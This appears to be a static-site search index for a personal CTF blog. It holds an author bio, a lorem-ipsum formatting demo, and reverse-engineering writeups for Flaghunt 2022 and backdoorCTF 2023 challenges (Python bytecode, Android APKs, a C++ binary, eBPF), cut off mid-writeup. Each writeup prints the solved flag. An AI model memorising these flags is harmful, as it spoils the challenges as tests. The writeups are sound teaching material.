var __index = {"config":{"lang":["en"],"separator":"[\\s\\-,:!=\\[\\]()\"/]+|(?!\\b)(?=[A-Z][a-z])|\\.(?!\\d)|&[lg]t;","pipeline":["stopWordFilter"]},"docs":[{"location":"index.html","title":"About me","text":"Md Abdullahil Kafi <p>I have recently graduated from IUT, Dhaka in CSE. I have been actively involved in cybersecurity related stuffs since 2021. I regularly participate in CTFs as a member of <code>IUT GENESIS</code> team. We are currently the best in our country according to <code>CTFtime.org</code>. We have won several ctf championships in our country. We also participated in organizing some of the reputed CTF competitions in our country. I post some of my CTF writeups here.</p>"},{"location":"blog/2023/11/20/hello-world.html","title":"Hello World","text":"<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> title of note <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>title of note</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <p>Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit.</p> <ol> <li> I'm an annotation! I can contain <code>code</code>, formatted     text, images, ... basically anything that can be expressed in Markdown.</li> </ol> <p>Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit.</p> <ol> <li> <p> I'm an annotation! (1)</p> <ol> <li> I'm an annotation as well!</li> </ol> </li> </ol> <p>Phasellus posuere in sem ut cursus (1)</p> <p>Lorem ipsum dolor sit amet, (2) consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.</p> <ol> <li> I'm an annotation!</li> <li> I'm an annotation as well!</li> </ol> Tab 1Tab 2 <p>Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit.</p> <ol> <li> I'm an annotation!</li> </ol> <p>Phasellus posuere in sem ut cursus (1)</p> <ol> <li> I'm an annotation as well!</li> </ol> <p>Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit.</p> <ol> <li> I'm an annotation!</li> </ol> CC++Unordered listOrdered list <pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n  printf(\"Hello world!\\n\");\n  return 0;\n}\n</code></pre> <pre><code>#include &lt;iostream&gt;\n\nint main(void) {\n  std::cout &lt;&lt; \"Hello world!\" &lt;&lt; std::endl;\n  return 0;\n}\n</code></pre> <ul> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ul> <ol> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ol> <p>Example</p> Unordered ListOrdered List <pre><code>* Sed sagittis eleifend rutrum\n* Donec vitae suscipit est\n* Nulla tempor lobortis orci\n</code></pre> <pre><code>1. Sed sagittis eleifend rutrum\n2. Donec vitae suscipit est\n3. Nulla tempor lobortis orci\n</code></pre> <pre><code>graph LR\n  A[Start] --&gt; B{Error?};\n  B --&gt;|Yes| C[Hmm...];\n  C --&gt; D[Debug];\n  D --&gt; B;\n  B ----&gt;|No| E[Yay!];</code></pre> <pre><code>sequenceDiagram\n  autonumber\n  Alice-&gt;&gt;John: Hello John, how are you?\n  loop Healthcheck\n      John-&gt;&gt;John: Fight against hypochondria\n  end\n  Note right of John: Rational thoughts!\n  John--&gt;&gt;Alice: Great!\n  John-&gt;&gt;Bob: How about you?\n  Bob--&gt;&gt;John: Jolly good!</code></pre> <pre><code>stateDiagram-v2\n  state fork_state &lt;&lt;fork&gt;&gt;\n    [*] --&gt; fork_state\n    fork_state --&gt; State2\n    fork_state --&gt; State3\n\n    state join_state &lt;&lt;join&gt;&gt;\n    State2 --&gt; join_state\n    State3 --&gt; join_state\n    join_state --&gt; State4\n    State4 --&gt; [*]</code></pre> <pre><code>classDiagram\n  Person &lt;|-- Student\n  Person &lt;|-- Professor\n  Person : +String name\n  Person : +String phoneNumber\n  Person : +String emailAddress\n  Person: +purchaseParkingPass()\n  Address \"1\" &lt;-- \"0..1\" Person:lives at\n  class Student{\n    +int studentNumber\n    +int averageMark\n    +isEligibleToEnrol()\n    +getSeminarsTaken()\n  }\n  class Professor{\n    +int salary\n  }\n  class Address{\n    +String street\n    +String city\n    +String state\n    +int postalCode\n    +String country\n    -validate()\n    +outputAsLabel()\n  }</code></pre> <pre><code>erDiagram\n  CUSTOMER ||--o{ ORDER : places\n  ORDER ||--|{ LINE-ITEM : contains\n  LINE-ITEM {\n    string name\n    int pricePerUnit\n  }\n  CUSTOMER }|..|{ DELIVERY-ADDRESS : uses</code></pre> <p>Lorem ipsum<sup>1</sup> dolor sit amet, consectetur adipiscing elit.<sup>2</sup></p> <p>Text can be deleted and replacement text added. This can also be combined into onea single operation. Highlighting is also possible and comments can be added inline.</p> <p>Formatting can also be applied to blocks by putting the opening and closing tags on separate lines and adding new lines between the tags and the content.</p> <ul> <li>This was marked</li> <li>This was inserted</li> <li> <p>This was deleted</p> </li> <li> <p>H<sub>2</sub>O</p> </li> <li>A<sup>T</sup>A</li> </ul> <p>Ctrl+Alt+Del</p> <ul> <li> HTML for content and structure</li> <li> JavaScript for interactivity</li> <li> CSS for text running out of boxes</li> <li> Internet Explorer ... huh?</li> </ul> <ul> <li> <p> Set up in 5 minutes</p> <p>Install <code>mkdocs-material</code> with <code>pip</code> and get up and running in minutes</p> <p> Getting started</p> </li> <li> <p> It's just Markdown</p> <p>Focus on your content and generate a responsive and searchable static site</p> <p> Reference</p> </li> <li> <p> Made to measure</p> <p>Change the colors, fonts, language, icons, logo and more with a few lines</p> <p> Customization</p> </li> <li> <p> Open Source, MIT</p> <p>Material for MkDocs is licensed under MIT and available on [GitHub]</p> <p> License</p> </li> </ul> <p> HTML for content and structure</p> <p> JavaScript for interactivity</p> <p> CSS for text running out of boxes</p> <p> Internet Explorer ... huh?</p> Unordered listOrdered list <ul> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ul> <ol> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ol> Content tabs<pre><code>=== \"Unordered list\"\n\n    * Sed sagittis eleifend rutrum\n    * Donec vitae suscipit est\n    * Nulla tempor lobortis orci\n\n=== \"Ordered list\"\n\n    1. Sed sagittis eleifend rutrum\n    2. Donec vitae suscipit est\n    3. Nulla tempor lobortis orci\n</code></pre> Unordered listOrdered list <ul> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ul> <ol> <li>Sed sagittis eleifend rutrum</li> <li>Donec vitae suscipit est</li> <li>Nulla tempor lobortis orci</li> </ol> <p> </p> Image caption <p> </p> <ul> <li> <p>Nulla et rhoncus turpis. Mauris ultricies elementum leo. Duis efficitur   accumsan nibh eu mattis. Vivamus tempus velit eros, porttitor placerat nibh   lacinia sed. Aenean in finibus diam.</p> <ul> <li>Duis mollis est eget nibh volutpat, fermentum aliquet dui mollis.</li> <li>Nam vulputate tincidunt fringilla.</li> <li>Nullam dignissim ultrices urna non auctor.</li> </ul> </li> <li> <p>Vivamus id mi enim. Integer id turpis sapien. Ut condimentum lobortis     sagittis. Aliquam purus tellus, faucibus eget urna at, iaculis venenatis     nulla. Vivamus a pharetra leo.</p> <ol> <li> <p>Vivamus venenatis porttitor tortor sit amet rutrum. Pellentesque aliquet     quam enim, eu volutpat urna rutrum a. Nam vehicula nunc mauris, a     ultricies libero efficitur sed.</p> </li> <li> <p>Morbi eget dapibus felis. Vivamus venenatis porttitor tortor sit amet     rutrum. Pellentesque aliquet quam enim, eu volutpat urna rutrum a.</p> <ol> <li>Mauris dictum mi lacus</li> <li>Ut sit amet placerat ante</li> <li>Suspendisse ac eros arcu</li> </ol> </li> </ol> </li> </ul> <code>Lorem ipsum dolor sit amet</code> <p>Sed sagittis eleifend rutrum. Donec vitae suscipit est. Nullam tempus tellus non sem sollicitudin, quis rutrum leo facilisis.</p> <code>Cras arcu libero</code> <p>Aliquam metus eros, pretium sed nulla venenatis, faucibus auctor ex. Proin ut eros sed sapien ullamcorper consequat. Nunc ligula ante.</p> <p>Duis mollis est eget nibh volutpat, fermentum aliquet dui mollis. Nam vulputate tincidunt fringilla. Nullam dignissim ultrices urna non auctor.</p> <ul> <li> Lorem ipsum dolor sit amet, consectetur adipiscing elit</li> <li> Vestibulum convallis sit amet nisi a tincidunt<ul> <li> In hac habitasse platea dictumst</li> <li> In scelerisque nibh non dolor mollis congue sed et metus</li> <li> Praesent sed risus massa</li> </ul> </li> <li> Aenean pretium efficitur erat, donec pharetra, ligula non scelerisque</li> </ul> \\[ \\operatorname{ker} f=\\{g\\in G:f(g)=e_{H}\\}{\\mbox{.}} \\] <p>The homomorphism \\(f\\) is injective if and only if its kernel is only the singleton set \\(e_G\\), because otherwise \\(\\exists a,b\\in G\\) with \\(a\\neq b\\) such that \\(f(a)=f(b)\\).</p> <p>Hover me</p> <p>Hover me</p> <p></p> <p>The HTML specification is maintained by the W3C.</p> <ol> <li> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit.\u00a0\u21a9</p> </li> <li> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa.\u00a0\u21a9</p> </li> </ol>","tags":["mkdocs"]},{"location":"writeups/2022/flaghunt/index.html","title":"Flaghunt 2022 by CTF_BD","text":"","tags":["flaghunt","rev","python bytecode"]},{"location":"writeups/2022/flaghunt/index.html#weird-code","title":"Weird Code","text":"","tags":["flaghunt","rev","python bytecode"]},{"location":"writeups/2022/flaghunt/index.html#description","title":"Description","text":"<p>Can you find the flag from the file attached?</p> File_contents <pre><code>  3           0 LOAD_CONST               1 (4919)\n              2 STORE_FAST               0 (k)\n\n  4           4 LOAD_CONST               2 ('CTF_BD{__REDACTED__}')\n              6 STORE_FAST               1 (flag)\n\n  5           8 BUILD_LIST               0\n             10 STORE_FAST               2 (n)\n\n  6          12 LOAD_GLOBAL              0 (range)\n             14 LOAD_GLOBAL              1 (len)\n             16 LOAD_FAST                1 (flag)\n             18 CALL_FUNCTION            1\n             20 LOAD_CONST               3 (1)\n             22 BINARY_SUBTRACT\n             24 CALL_FUNCTION            1\n             26 GET_ITER\n        &gt;&gt;   28 FOR_ITER                46 (to 76)\n             30 STORE_FAST               3 (i)\n\n  7          32 LOAD_FAST                2 (n)\n             34 LOAD_METHOD              2 (append)\n      k       36 LOAD_FAST                0 (k)\n             38 LOAD_GLOBAL              3 (ord)\n             40 LOAD_FAST                1 (flag)\n             42 LOAD_FAST                3 (i)\n             44 BINARY_SUBSCR\n             46 CALL_FUNCTION            1\n             48 LOAD_GLOBAL              3 (ord)\n             50 LOAD_FAST                1 (flag)\n             52 LOAD_FAST                3 (i)\n             54 LOAD_CONST               3 (1)\n             56 BINARY_ADD\n             58 BINARY_SUBSCR\n             60 CALL_FUNCTION            1\n             62 BINARY_XOR\n             64 LOAD_CONST               4 (4)\n             66 BINARY_LSHIFT\n             68 BINARY_XOR\n             70 CALL_METHOD              1\n             72 POP_TOP\n             74 JUMP_ABSOLUTE           28\n\n  8     &gt;&gt;   76 LOAD_GLOBAL              4 (print)\n             78 LOAD_CONST               5 ('n = ')\n             80 LOAD_FAST                2 (n)\n             82 CALL_FUNCTION            2\n             84 POP_TOP\n             86 LOAD_CONST               0 (None)\n             88 RETURN_VALUE\n\nn =  [4679, 4631, 4775, 4839, 4951, 4295, 4487, 4519, 4439, 4839, 4231, 5095, 5959, 5623, 4855, 5127, 5751, 5703, 6103]\n</code></pre>","tags":["flaghunt","rev","python bytecode"]},{"location":"writeups/2022/flaghunt/index.html#solution","title":"Solution","text":"<p>The goal is to reverse engineer the flag from the output list <code>n</code>. The sauce is to understand what each instruction do and decompile the source into python code ourselves. Most of the instructions are easily understandable and most of us become confused about what <code>BINARY_SUBSCR</code> does and how <code>CALL_FUNCTION</code> works.</p> <p><code>BINARY_SUBSCR</code>: It stands for <code>binary subscript</code>. It does the job of index in a list. It takes in two parameters: the <code>name of the list</code> and the <code>index</code> of the item.</p> <p><code>CALL_FUNCTION</code>: It calls the function on top of the stack with the parameters passed to it in the stack. An example would be a fast way to learn. Consider offset 14-18 in the source code.</p> <pre><code>             14 LOAD_GLOBAL              1 (len)\n             16 LOAD_FAST                1 (flag)\n             18 CALL_FUNCTION            1\n</code></pre> <p>The <code>len</code> function is loaded on the stack first then it's parameter <code>flag</code>. So, the overall call stands for <code>len(flag)</code>. This is also true for operations involving more than one operands or parameters like <code>XOR</code> <code>ADD</code> <code>SUBTRACT</code>, etc. Similarly, we keep decompiling the source. You should decompile the rest by yourselves before continuing.</p> Decompiled_source <pre><code>k = 4919\n\nflag = 'CTF_BD{__REDACTED__}'\n\nn = []\n\nfor i in range(len(flag)-1):\n    n.append(k ^ ((ord(flag[i]) ^ ord(flag[i + 1])) &lt;&lt; 4))\n\nprint('n = ',n)\n</code></pre> Solution <pre><code>k = 4919\n\nn = [4679, 4631, 4775, 4839, 4951, 4295, 4487, 4519, 4439, 4839, 4231, 5095, 5959, 5623, 4855, 5127, 5751, 5703, 6103]\n\nflag = 'C'\n\nfor i in range(len(n)):\n    flag += chr((k ^ n[i]) &gt;&gt; 4 ^ ord(flag[i]))\n\nprint(flag)\n</code></pre> <p>flag: <code>CTF_BD{Py_Byt3_C0d3}</code></p>","tags":["flaghunt","rev","python bytecode"]},{"location":"writeups/2023/backdoor/index.html","title":"backdoorCTF 2023","text":"","tags":["backdoorCTF","rev"]},{"location":"writeups/2023/backdoor/index.html#open-sesame","title":"Open sesame","text":"<p>We were given this app to reverse engineer. This app asks for a user and password as input when installed. We will look into it's source code using jadx. It also comes with a gui. <pre><code>backdoor/rev/open_sesame on \ue0a0 master [?]\n\u276f jadx open_sesame.apk\nINFO  - loading ...\nINFO  - processing ...\nERROR - finished with errors, count: 30\n</code></pre></p> <p>The important part is the following inside the <code>MainActivity.java</code> file: <pre><code>    private static final int[] valid_password = {52, AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR, 49, 98, 97, 98, 97};\n    private static final String valid_user = \"Jack Ma\";\n    private Button buttonLogin;\n    private EditText editTextPassword;\n    private EditText editTextUsername;\n\n    /* JADX INFO: Access modifiers changed from: protected */\n    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity\n    public void onCreate(Bundle bundle) {\n        super.onCreate(bundle);\n        setContentView(R.layout.activity_main);\n        this.editTextUsername = (EditText) findViewById(R.id.editTextUsername);\n        this.editTextPassword = (EditText) findViewById(R.id.editTextPassword);\n        Button button = (Button) findViewById(R.id.buttonLogin);\n        this.buttonLogin = button;\n        button.setOnClickListener(new View.OnClickListener() { // from class: com.example.open_sesame.MainActivity.1\n            @Override // android.view.View.OnClickListener\n            public void onClick(View view) {\n                MainActivity.this.validateCredentials();\n            }\n        });\n    }\n\n    /* JADX INFO: Access modifiers changed from: private */\n    public void validateCredentials() {\n        String trim = this.editTextUsername.getText().toString().trim();\n        String trim2 = this.editTextPassword.getText().toString().trim();\n        if (trim.equals(valid_user) &amp;&amp; n4ut1lus(trim2)) {\n            String str = \"flag{\" + flag(Integer.toString(sl4y3r(sh4dy(trim2))), \"U|]rURuoU^PoR_FDMo@X]uBUg\") + \"}\";\n            return;\n        }\n        showToast(\"Invalid credentials. Please try again.\");\n    }\n</code></pre></p> <p>We see that valid_password is already declared inside it. A quick google and we can tell that <code>AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR</code> is a constant in the <code>AppCompatDelegate</code> class with value equaling <code>108</code>.</p> <p></p> <p>This app only shows toast when the user password combination is wrong and only calculates the flag upon entering the correct credentials. We can just take the whole code and write our own solution that will print the flag.</p> <pre><code>backdoor/rev/open_sesame on \ue0a0 master [?] via \u2615 v21\n\u276f javac Sol.java\n\nbackdoor/rev/open_sesame on \ue0a0 master [?] via \u2615 v21\n\u276f java Sol\nflag{aLiBabA_and_forty_thiEveS}\n</code></pre> <p>flag: <code>flag{aLiBabA_and_forty_thiEveS}</code></p>","tags":["backdoorCTF","rev"]},{"location":"writeups/2023/backdoor/index.html#secret-door","title":"Secret door","text":"<p>We were given a zip file that contained two files. One is the challenge binary and the other is an encoded binary data file that we need to decode.</p> <pre><code>backdoor/rev/secret_door on \ue0a0 master [!?]\n\u276f tree\n.\n\u251c\u2500\u2500 chall.out\n\u251c\u2500\u2500 encoded.bin\n\u2514\u2500\u2500 public.zip\n</code></pre> <p>A c++ binary can be really annoying to reverse with gidhra. But I will just show some relevant codes that are interesting to the workflow of the binary.</p> <pre><code>  buf = operator.new[](0x44);\n  piVar3 = func_4(buff,argv[1]);\n  buf = func_3(piVar3,sus);\n  cVar1 = func_2(buf);\n  if (cVar1 == '\\0') {\n    std::operator&lt;&lt;(std::cout,\"Wrong door\");\n  }\n  else {\n    func_1(*buf,buf[0x10]);\n  }\n</code></pre> <p>Here, we see that there is a new buffer of size 0x44 being created. Then some functions are called with this new buffer and our input argument 1 as parameters. The check only fails if <code>func_2</code> returns 0. Let's peek into func_2 to see what it does.</p> <pre><code>undefined8 func_2(int *key)\n\n{\n  undefined8 uVar1;\n\n  if (((((((*key == 0x4e) &amp;&amp; (key[1] != (*key == 0xf))) &amp;&amp; (key[2] == 0x78)) &amp;&amp;\n        ((key[3] != (key[2] == 0x1f) &amp;&amp; (key[4] == 0x78)))) &amp;&amp;\n       ((key[5] != (key[4] == 0xb) &amp;&amp; ((key[6] == 0x74 &amp;&amp; (key[6] != (key[7] == 6))))))) &amp;&amp;\n      (key[8] == 100)) &amp;&amp;\n     ((((key[9] != (key[8] == 0x21) &amp;&amp; (key[10] == 99)) &amp;&amp; (key[0xb] != (key[10] == 0x22))) &amp;&amp;\n      (((key[0xc] == 0x78 &amp;&amp; (key[0xd] == key[0xc])) &amp;&amp;\n       ((key[0xe] == 0x72 &amp;&amp; ((key[0xf] == key[0xe] + 1 &amp;&amp; (key[0x10] == 0x21)))))))))) {\n    uVar1 = 1;\n  }\n  else {\n    uVar1 = 0;\n  }\n  return uVar1;\n}\n</code></pre> <p>It is clear that our input should be such that we need to pass this check and then the binary will call another function with the first and 0x10th character of the newly created and modified through some functions. But if we look closely, we know what the 1<sup>st</sup> and 0x10th characters should be. They are matched against a fixed value inside <code>func_2</code>. They are <code>0x4e</code> and <code>0x21</code> respectively.</p> <p>Now let's see what happens inside <code>func_1</code></p> <pre><code>/* func_1(int, int) */\n\n/* DISPLAY WARNING: Type casts are NOT being printed */\n\nundefined8 func_1(int param_1,int param_2)\n\n{\n  byte *pbVar1;\n  long lVar2;\n  long in_FS_OFFSET;\n  allocator&lt;char&gt; local_48d;\n  uint i;\n  istreambuf_iterator local_488 [2];\n  allocator *local_480;\n  istreambuf_iterator&lt;&gt; local_478 [16];\n  allocator local_468 [32];\n  basic_string&lt;&gt; local_448 [32];\n  basic_ofstream&lt;&gt; local_428 [512];\n  basic_string local_228 [520];\n  long local_20;\n\n  local_20 = *(in_FS_OFFSET + 0x28);\n  std::allocator&lt;char&gt;::allocator();\n                    /* try { // try from 0010273e to 00102742 has its CatchHandler @ 0010292d */\n  std::__cxx11::basic_string&lt;&gt;::basic_string&lt;&gt;(local_448,\"encoded.bin\",local_468);\n  std::allocator&lt;char&gt;::~allocator(local_468);\n                    /* try { // try from 0010276b to 0010276f has its CatchHandler @ 001029a5 */\n  std::basic_ifstream&lt;&gt;::basic_ifstream(local_228,local_448);\n  std::allocator&lt;char&gt;::allocator();\n  std::istreambuf_iterator&lt;&gt;::istreambuf_iterator(local_478);\n  std::istreambuf_iterator&lt;&gt;::istreambuf_iterator(local_488);\n                    /* try { // try from 001027da to 001027de has its CatchHandler @ 0010294e */\n  std::vector&lt;&gt;::vector&lt;&gt;(local_468,local_488[0],local_480);\n  std::allocator&lt;char&gt;::~allocator(&amp;local_48d);\n  for (i = 0; i &lt; 90246; i += 1) {\n    if ((i &amp; 1) == 0) {\n      pbVar1 = std::vector&lt;&gt;::operator[](local_468,i);\n      *pbVar1 = *pbVar1 ^ param_1;\n    }\n    else {\n      pbVar1 = std::vector&lt;&gt;::operator[](local_468,i);\n      *pbVar1 = *pbVar1 ^ param_2;\n    }\n  }\n                    /* try { // try from 00102885 to 00102889 has its CatchHandler @ 0010297e */\n  std::basic_ofstream&lt;&gt;::basic_ofstream(local_428,1069148);\n  std::vector&lt;&gt;::size(local_468);\n  lVar2 = std::vector&lt;&gt;::data(local_468);\n                    /* try { // try from 001028be to 001028d1 has its CatchHandler @ 00102966 */\n  std::basic_ostream&lt;&gt;::write(local_428,lVar2);\n  std::basic_ofstream&lt;&gt;::close();\n  std::basic_ofstream&lt;&gt;::~basic_ofstream(local_428);\n  std::vector&lt;&gt;::~vector(local_468);\n  std::basic_ifstream&lt;&gt;::~basic_ifstream(local_228);\n  std::__cxx11::basic_string&lt;&gt;::~basic_string(local_448);\n  if (local_20 != *(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_chk_fail();\n  }\n  return 0;\n}\n</code></pre> <p>Looks like they are opening our encoded file and decoding it with xoring it with the two parameters. Note that no other characters of the buffer created matters. Nor does our key input matter. We should be able to call our function with setting our own parameters inside gdb.</p> <pre><code>backdoor/rev/secret_door\n\u276f la\ntotal 236K\n-rwxrwxr-x 1 groot groot  44K Dec 12 11:31 chall.out*\n-rw-rw-r-- 1 groot groot  89K Dec 12 11:31 encoded.bin\n-rw-r--r-- 1 groot groot  94K Dec 16 18:04 public.zip\n\nbackdoor/rev/secret_door\n\u276f gdb chall.out\ngef\u27a4  start\ngef\u27a4  call (void)func_1(0x4e, 0x21)\ngef\u27a4  q\n\nbackdoor/rev/secret_door took 31s\n\u276f la\ntotal 328K\n-rwxrwxr-x 1 groot groot  44K Dec 12 11:31 chall.out*\n-rw-rw-r-- 1 groot groot  89K Dec 12 11:31 encoded.bin\n-rw-r--r-- 1 groot groot  94K Dec 16 18:04 public.zip\n-rw-r--r-- 1 groot groot  89K Dec 25 20:41 the_door.jpg\n</code></pre> <p>The door looks like this:</p> <p></p> <p>flag: <code>flag{0p3n3d_7h3_s3cr3t_r3d_d00r}</code></p>","tags":["backdoorCTF","rev"]},{"location":"writeups/2023/backdoor/index.html#baby-ebpf","title":"Baby-ebpf","text":"<p>We were given a ebpf elf file. The intended solve for this was to load this ebpf and look at the kernel trace. But I just old-school reversed it with objdump.</p> <pre><code>backdoor/rev/babyebpf on \ue0a0 master [!?]\n\u276f objdump -d babyebpf.o\n\nbabyebpf.o:     file format elf64-bpfle\n\n\nDisassembly of section tp/syscalls/sys_enter_execve:\n\n0000000000000000 &lt;detect_execve&gt;:\n   0:   b7 01 00 00 44 04 05 1c         mov %r1,0x1c050444\n   8:   63 1a f8 ff 00 00 00 00         stxw [%fp+-8],%r1\n  10:   18 01 00 00 19 08 34 01         lddw %r1,0x954094701340819\n  18:   00 00 00 00 47 09 54 09\n  20:   7b 1a f0 ff 00 00 00 00         stxdw [%fp+-16],%r1\n  28:   18 01 00 00 13 57 3e 40         lddw %r1,0x10523251403e5713\n  30:   00 00 00 00 51 32 52 10\n  38:   7b 1a e8 ff 00 00 00 00         stxdw [%fp+-24],%r1\n  40:   18 01 00 00 0b 0d 13 0e         lddw %r1,0x43075a150e130d0b\n  48:   00 00 00 00 15 5a 07 43\n  50:   7b 1a e0 ff 00 00 00 00         stxdw [%fp+-32],%r1\n  58:   b7 01 00 00 00 00 00 00         mov %r1,0\n\n0000000000000060 &lt;LBB0_1&gt;:\n  60:   18 02 00 00 00 00 00 00         lddw %r2,0\n  68:   00 00 00 00 00 00 00 00\n  70:   0f 12 00 00 00 00 00 00         add %r2,%r1\n  78:   71 22 00 00 00 00 00 00         ldxb %r2,[%r2+0]\n  80:   bf a3 00 00 00 00 00 00         mov %r3,%fp\n  88:   07 03 00 00 e0 ff ff ff         add %r3,-32\n  90:   0f 13 00 00 00 00 00 00         add %r3,%r1\n  98:   71 34 00 00 00 00 00 00         ldxb %r4,[%r3+0]\n  a0:   af 42 00 00 00 00 00 00         xor %r2,%r4\n  a8:   73 23 00 00 00 00 00 00         stxb [%r3+0],%r2\n  b0:   07 01 00 00 01 00 00 00         add %r1,1\n  b8:   15 01 01 00 1c 00 00 00         jeq %r1,0x1c,1\n  c0:   05 00 f3 ff 00 00 00 00         ja -13\n\n00000000000000c8 &lt;LBB0_2&gt;:\n  c8:   bf a3 00 00 00 00 00 00         mov %r3,%fp\n  d0:   07 03 00 00 e0 ff ff ff         add %r3,-32\n  d8:   18 01 00 00 1c 00 00 00         lddw %r1,0x1c\n  e0:   00 00 00 00 00 00 00 00\n  e8:   b7 02 00 00 04 00 00 00         mov %r2,4\n  f0:   85 00 00 00 06 00 00 00         call 6\n  f8:   b7 00 00 00 01 00 00 00         mov %r0,1\n 100:   95 00 00 00 00 00 00 00         exit\n</code></pre> <p>The <code>detect_execve</code> function saves some constant values in the memory. <code>LBB0_1</code> function uses some memory string as reference as the key for xoring and <code>LBB0_2</code> function was used to print the flag out in the kernel trace. I rewrote the algorithm in c.</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n  char *key = \"marinkitagawamarinkitagawama\\0\";\n  char arr[] = {0x0b, 0x0d, 0x13, 0x0e, 0x15, 0x5a, 0x07, 0x43, 0x13, 0x57,\n                0x3e, 0x40, 0x51, 0x32, 0x52, 0x10, 0x19, 0x08, 0x34, 0x01,\n                0x47, 0x09, 0x54, 0x09, 0x44, 0x04, 0x05, 0x1c};\n  int len = sizeof(arr) / sizeof(arr[0]);\n  for (int i = 0; i &lt; len; i++) {\n    printf(\"%c\", arr[i] ^ key[i]);\n  }\n}\n</code></pre> <p>The key string was obtained after i did strings on the ebpf file. That looked sus and it worked out. I am sure it won't be this easy next time. So gotta learn about ebpf.</p> <p>flag: <code>flag{1n7r0_70_3bpf_h3h3h3eh}</code></p>","tags":["backdoorCTF","rev"]},{"location":"writeups/2023/backdoor/index.html#sl4ydroid","title":"Sl4ydroid","text":"<p>We were given an android app again. This time the app just runs and nothing happens. First I looked at the source code with jadx. The app was loading a custom library.</p> <pre><code>    public native void damn(String str);\n\n    public native void k2(String str);\n\n    public native void kim(String str);\n\n    public native void nim(String str);\n\n    static {\n        System.loadLibrary(\"sl4ydroid\");\n    }\n\n    /* JADX INFO: Access modifiers changed from: protected */\n    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity\n    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        TextView textView = (TextView) findViewById(R.id.displayTextView);\n        this.displayTextView = textView;\n        textView.setVisibility(8);\n        TextView textView2 = (TextView) findViewById(R.id.textView);\n        this.textView = textView2;\n        textView2.setText(getResources().getString(R.string.message));\n        kim(getResources().getString(R.string.k1));\n        nim(getResources().getString(R.string.n1));\n        damn(getResources().getString(R.string.d1));\n        k2(getResources().getString(R.string.k21));\n    }\n</code></pre> <p>The app loads the library functions and calls them with the strings defined in the app resource section. The library binary could be found inside <code>resources/lib</code> folder. Upon 